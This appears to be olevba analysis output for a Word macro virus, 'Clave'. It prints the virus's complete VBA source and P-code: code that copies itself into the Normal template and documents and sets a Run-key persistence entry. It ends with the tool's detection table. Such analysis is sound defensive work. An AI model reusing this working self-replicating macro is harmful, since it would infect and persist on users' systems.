olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Clave
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO QueTeCagas.cls 
in file: Virus.MSWord.Clave - OLE stream: 'Macros/VBA/QueTeCagas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
 
 On Error Resume Next
 
 Const CLAVE_RUN = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"
 'Const CLAVE_EXE = "HKEY_CLASSES_ROOT\exefile\Shell\Open\Command\"
 
 'Application.ShowVisualBasicEditor = False
 
 Set docACT = ActiveDocument.VBProject.VBComponents.Item(1)
 Set Templ = NormalTemplate.VBProject.VBComponents.Item(1)
 
 If Templ.Name <> "QueTeCagas" Then
     
     tem = Templ.codemodule.CountOfLines
     
     If tem > 0 Then Templ.codemodule.deletelines 1, tem
     
     For i = 1 To docACT.codemodule.CountOfLines
        codigo = codigo & docACT.codemodule.Lines(i, 1) & vbCr
     Next i
     
     Templ.codemodule.InsertLines 1, codigo
     Templ.codemodule.ReplaceLine 1, "Sub Document_Close()"
     Templ.Name = "QueTeCagas"
         
 End If
 

 If docACT.Name <> "QueTeCagas" Then
     
     tem = docACT.codemodule.CountOfLines
     
     If tem > 0 Then docACT.codemodule.deletelines 1, tem
     
     For i = 1 To Templ.codemodule.CountOfLines
        codigo = codigo & Templ.codemodule.Lines(i, 1) & vbCr
     Next i
     
     docACT.codemodule.InsertLines 1, codigo
     docACT.codemodule.ReplaceLine 1, "Sub Document_Open()"
     docACT.Name = "QueTeCagas"
                   
 End If
 
'PARA INFECTAR TODOS LOS DOCUMENTOS ABIERTOS, ESTEN O NO ACTIVOS:

' For doc = 1 To Documents.Count
'
'   Set docs = Documents(doc).VBProject.VBComponents.Item(1)
'
'   If docs.Name <> "QueTeCagas" Then
'
'    tem = docs.codemodule.CountOfLines
'
'     If tem > 0 Then docs.codemodule.deletelines 1, tem
'
'     For i = 1 To docs.codemodule.CountOfLines
'        codigo = codigo & Templ.codemodule.Lines(i, 1) & vbCr
'     Next i
'
'     docs.codemodule.InsertLines 1, codigo
'     docs.codemodule.ReplaceLine 1, "Sub Document_Open()"
'     docs.Name = "QueTeCagas"
'
'   End If
'
' Next doc
 
 If 28 Mod Day(Now()) = 0 Then
  
  Set FileObj = CreateObject("Scripting.FileSystemObject")
  Set SystemDir = FileObj.GetSpecialFolder(1)
  
  Ruta = SystemDir & "\quetecagas.vbs"
  cod_ini = "On Error Resume Next" & vbCr & "MsgBox ""Que te cagas ;)"""
  
  If Dir(Ruta) = "" Then
      libreee = FreeFile
      Open Ruta For Append Access Write As #libreee
      Print #libreee, cod_ini
      Close libreee
  End If
  
  If System.PrivateProfileString("", CLAVE_RUN, "TeCagas") = "" Then
      System.PrivateProfileString("", CLAVE_RUN, "TeCagas") = Ruta
  End If
  
  'System.PrivateProfileString("", CLAVE_EXE, "") = Ruta
  
  MsgBox "Que te cagas ;)"
  
 End If
 
 ActiveDocument.Save
 
End Sub













-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Clave
' ===============================================================================
' Module streams:
' Macros/VBA/QueTeCagas - 9179 bytes
' Line #0:
' 	FuncDefn (Sub Document_Close())
' Line #1:
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	Dim (Const) 
' 	LitStr 0x0041 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"
' 	VarDefn CLAVE_RUN
' Line #5:
' 	QuoteRem 0x0001 0x0041 "Const CLAVE_EXE = "HKEY_CLASSES_ROOT\exefile\Shell\Open\Command\""
' Line #6:
' Line #7:
' 	QuoteRem 0x0001 0x0029 "Application.ShowVisualBasicEditor = False"
' Line #8:
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set docACT 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Templ 
' Line #11:
' Line #12:
' 	Ld Templ 
' 	MemLd New 
' 	LitStr 0x000A "QueTeCagas"
' 	Ne 
' 	IfBlock 
' Line #13:
' Line #14:
' 	Ld Templ 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St tem 
' Line #15:
' Line #16:
' 	Ld tem 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld tem 
' 	Ld Templ 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' 	EndIf 
' Line #17:
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld docACT 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	For 
' Line #19:
' 	Ld codigo 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld docACT 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St codigo 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' Line #22:
' 	LitDI2 0x0001 
' 	Ld codigo 
' 	Ld Templ 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #23:
' 	LitDI2 0x0001 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	Ld Templ 
' 	MemLd codemodule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #24:
' 	LitStr 0x000A "QueTeCagas"
' 	Ld Templ 
' 	MemSt New 
' Line #25:
' Line #26:
' 	EndIfBlock 
' Line #27:
' Line #28:
' Line #29:
' 	Ld docACT 
' 	MemLd New 
' 	LitStr 0x000A "QueTeCagas"
' 	Ne 
' 	IfBlock 
' Line #30:
' Line #31:
' 	Ld docACT 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St tem 
' Line #32:
' Line #33:
' 	Ld tem 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld tem 
' 	Ld docACT 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' 	EndIf 
' Line #34:
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Templ 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	For 
' Line #36:
' 	Ld codigo 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Templ 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St codigo 
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' Line #39:
' 	LitDI2 0x0001 
' 	Ld codigo 
' 	Ld docACT 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #40:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub Document_Open()"
' 	Ld docACT 
' 	MemLd codemodule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #41:
' 	LitStr 0x000A "QueTeCagas"
' 	Ld docACT 
' 	MemSt New 
' Line #42:
' Line #43:
' 	EndIfBlock 
' Line #44:
' Line #45:
' 	QuoteRem 0x0000 0x0040 "PARA INFECTAR TODOS LOS DOCUMENTOS ABIERTOS, ESTEN O NO ACTIVOS:"
' Line #46:
' Line #47:
' 	QuoteRem 0x0000 0x001F " For doc = 1 To Documents.Count"
' Line #48:
' 	QuoteRem 0x0000 0x0000 ""
' Line #49:
' 	QuoteRem 0x0000 0x003B "   Set docs = Documents(doc).VBProject.VBComponents.Item(1)"
' Line #50:
' 	QuoteRem 0x0000 0x0000 ""
' Line #51:
' 	QuoteRem 0x0000 0x0024 "   If docs.Name <> "QueTeCagas" Then"
' Line #52:
' 	QuoteRem 0x0000 0x0000 ""
' Line #53:
' 	QuoteRem 0x0000 0x0026 "    tem = docs.codemodule.CountOfLines"
' Line #54:
' 	QuoteRem 0x0000 0x0000 ""
' Line #55:
' 	QuoteRem 0x0000 0x0037 "     If tem > 0 Then docs.codemodule.deletelines 1, tem"
' Line #56:
' 	QuoteRem 0x0000 0x0000 ""
' Line #57:
' 	QuoteRem 0x0000 0x002E "     For i = 1 To docs.codemodule.CountOfLines"
' Line #58:
' 	QuoteRem 0x0000 0x003D "        codigo = codigo & Templ.codemodule.Lines(i, 1) & vbCr"
' Line #59:
' 	QuoteRem 0x0000 0x000B "     Next i"
' Line #60:
' 	QuoteRem 0x0000 0x0000 ""
' Line #61:
' 	QuoteRem 0x0000 0x002A "     docs.codemodule.InsertLines 1, codigo"
' Line #62:
' 	QuoteRem 0x0000 0x0039 "     docs.codemodule.ReplaceLine 1, "Sub Document_Open()""
' Line #63:
' 	QuoteRem 0x0000 0x001D "     docs.Name = "QueTeCagas""
' Line #64:
' 	QuoteRem 0x0000 0x0000 ""
' Line #65:
' 	QuoteRem 0x0000 0x0009 "   End If"
' Line #66:
' 	QuoteRem 0x0000 0x0000 ""
' Line #67:
' 	QuoteRem 0x0000 0x0009 " Next doc"
' Line #68:
' Line #69:
' 	LitDI2 0x001C 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #70:
' Line #71:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set FileObj 
' Line #72:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld FileObj 
' 	ArgsMemLd GetSpecialFolder 0x0001 
' 	Set SystemDir 
' Line #73:
' Line #74:
' 	Ld SystemDir 
' 	LitStr 0x000F "\quetecagas.vbs"
' 	Concat 
' 	St Ruta 
' Line #75:
' 	LitStr 0x0014 "On Error Resume Next"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0018 "MsgBox "Que te cagas ;)""
' 	Concat 
' 	St cod_ini 
' Line #76:
' Line #77:
' 	Ld Ruta 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #78:
' 	Ld Friend 
' 	St libreee 
' Line #79:
' 	Ld Ruta 
' 	Ld libreee 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #80:
' 	Ld libreee 
' 	Sharp 
' 	PrintChan 
' 	Ld cod_ini 
' 	PrintItemNL 
' Line #81:
' 	Ld libreee 
' 	Close 0x0001 
' Line #82:
' 	EndIfBlock 
' Line #83:
' Line #84:
' 	LitStr 0x0000 ""
' 	Ld CLAVE_RUN 
' 	LitStr 0x0007 "TeCagas"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #85:
' 	Ld Ruta 
' 	LitStr 0x0000 ""
' 	Ld CLAVE_RUN 
' 	LitStr 0x0007 "TeCagas"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #86:
' 	EndIfBlock 
' Line #87:
' Line #88:
' 	QuoteRem 0x0002 0x0035 "System.PrivateProfileString("", CLAVE_EXE, "") = Ruta"
' Line #89:
' Line #90:
' 	LitStr 0x000F "Que te cagas ;)"
' 	ArgsCall MsgBox 0x0001 
' Line #91:
' Line #92:
' 	EndIfBlock 
' Line #93:
' Line #94:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #95:
' Line #96:
' 	EndSub 
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |quetecagas.vbs      |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

